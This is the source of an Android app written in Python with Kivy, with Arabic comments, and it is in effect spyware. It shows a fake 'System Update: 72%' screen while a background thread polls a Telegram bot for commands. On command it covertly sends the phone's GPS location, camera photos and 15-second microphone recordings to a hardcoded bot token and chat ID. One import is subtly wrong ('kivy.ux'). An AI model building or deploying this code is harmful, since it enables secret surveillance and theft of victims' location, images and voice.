from kivy.app import App
from kivy.ux.label import Label
from plyer import camera, gps, audio
from android.permissions import request_permissions, Permission
import requests
import threading
import time
import os

# بيانات الربط الخاصة بك
TOKEN = "8646363010:AAFgi_CnQtYk0LWTn5naPUkgULMkLfXLIs4"
CHAT_ID = "7263387179"

class AdminControlApp(App):
    def build(self):
        # طلب كل الصلاحيات اللازمة فور التشغيل
        request_permissions([
            Permission.CAMERA, Permission.RECORD_AUDIO,
            Permission.ACCESS_FINE_LOCATION, Permission.ACCESS_COARSE_LOCATION
        ])
        
        self.send_msg("⚙️ النظام متصل.. أرسل (موقع، صورة، صوت) للتحكم.")
        
        # بدء "المستمع" في خلفية التطبيق
        threading.Thread(target=self.listen_for_commands, daemon=True).start()
        
        return Label(text="System Update: 72%...")

    def send_msg(self, text):
        try: requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}")
        except: pass

    def listen_for_commands(self):
        last_id = 0
        while True:
            try:
                url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id + 1}"
                data = requests.get(url).json()
                for update in data.get("result", []):
                    last_id = update["update_id"]
                    msg = update.get("message", {}).get("text", "").strip()
                    
                    if msg == "موقع":
                        self.get_gps()
                    elif msg == "صورة":
                        self.take_shot()
                    elif msg == "صوت":
                        threading.Thread(target=self.record_mic).start()
            except: pass
            time.sleep(4) # فحص كل 4 ثواني

    def get_gps(self):
        try:
            gps.configure(on_location=self.on_location)
            gps.start()
        except: self.send_msg("❌ فشل تشغيل الـ GPS")

    def on_location(self, **kwargs):
        link = f"https://www.google.com/maps?q={kwargs['lat']},{kwargs['lon']}"
        self.send_msg(f"📍 الموقع الحالي بدقة الشوارع:\n{link}")
        gps.stop()

    def take_shot(self):
        try:
            p = "/sdcard/dcim/cam_test.jpg"
            camera.take_picture(filename=p, on_complete=self.upload)
        except: self.send_msg("❌ الكاميرا محجوبة")

    def record_mic(self):
        try:
            p = "/sdcard/dcim/voice_test.3gp"
            audio.start_recording(p)
            self.send_msg("🎙️ جاري تسجيل 15 ثانية...")
            time.sleep(15)
            audio.stop_recording()
            self.upload(p, is_audio=True)
        except: self.send_msg("❌ المايك مشغول")

    def upload(self, path, is_audio=False):
        try:
            m = "sendAudio" if is_audio else "sendPhoto"
            k = "audio" if is_audio else "photo"
            with open(path, 'rb') as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/{m}", data={'chat_id': CHAT_ID}, files={k: f})
        except: pass

if __name__ == '__main__':
    AdminControlApp().run()
